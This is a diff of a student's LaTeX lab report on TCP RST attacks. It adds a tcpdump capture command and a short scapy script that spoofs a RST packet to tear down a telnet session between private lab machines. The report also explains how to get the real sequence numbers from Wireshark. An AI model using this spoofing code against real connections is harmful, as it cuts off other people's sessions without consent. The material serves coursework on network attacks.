@@ -30,12 +30,36 @@ With \code{sudo tcpdump tcp and host 192.168.137.160}, I can capture all traffic
   \item[$\bullet$]
   Using \code{netwox} to attack ssh connect, the result is almost the same, except the error massage said \code{"Broken pipe"}.\\
   Screenshot:
-  \href{https://i.loli.net/2018/09/11/5b97536e44d80.png}{Client}.
+  \href{https://i.loli.net/2018/09/11/5b97536e44d80.png}{Client}.\\
   By the way before the final "correct" out put, you can see there is several unsuccessful attempts. That is because I were attacking the wrong port.
   \item[$\bullet$]
-  Trying to use scapy to reproduce the same attacking on telnet and ssh connection.
+  Trying to use scapy to reproduce the same attacking on telnet and ssh connection. In order to do that, we need to capture the tcp traffic manually and spoof a RST request send to Server. Since I'm using pure command line mode due to the laggy GUI interface. I choose to using \code{tcpdump} on the Attacker to capture the traffic and create the \code{.cap} file inside the shared folder and observe the dumped traffic using wireshark in the host win10 machine. Followings are several command I used to conduct the attack and the python script code to spoof RST request.\\
+  Capture: \code{sudo tcpdump tcp and host 192.168.137.150 and 192.168.137.140}\\
+  Python:
+  \begin{tlist}{2}
+    \item[]
+    \code{
+\#!/usr/bin/pyton3\\
+from scapy.all import *
+\vspace{12pt}\\
+ip = IP(src="192.168.137.150", dst="192.168.137.140")\\
+tcp = TCP(sport=46176, dport=23, flags="R", seq=3375652917, ack=1837764021)\\
+pkt = ip/tcp\\
+ls(pkt)\\
+print(pkt)\\
+send(pkt, verbose=0)
+    }
+  \end{tlist}
+  Screenshot:
+  \href{https://i.loli.net/2018/09/12/5b9810585b7d3.png}{Attacker},
+  \href{https://i.loli.net/2018/09/12/5b98105863974.png}{Client},
+  \href{https://i.loli.net/2018/09/12/5b981058a7e99.png}{RST request}.\\
+  To be honest, I didn't successed at first time. In the first several try, I didn't noticed that the seq and ack number displayed in wireshark is quoted as "relative sequence number", and obviously I won't success with those relative value. So after I turn off the "Display relatively" in wireshark. I made it in one shoot.
 \end{tlist}
 
 \subsection{TCP RST Attacks on Video Streaming Applications}
+This task is essentially the same as the task 2, but with the GUI response. I shouldn't and didn't encounter any issure for this task.
+
 \subsection{TCP Session Hijacking}
+
 \end{document}
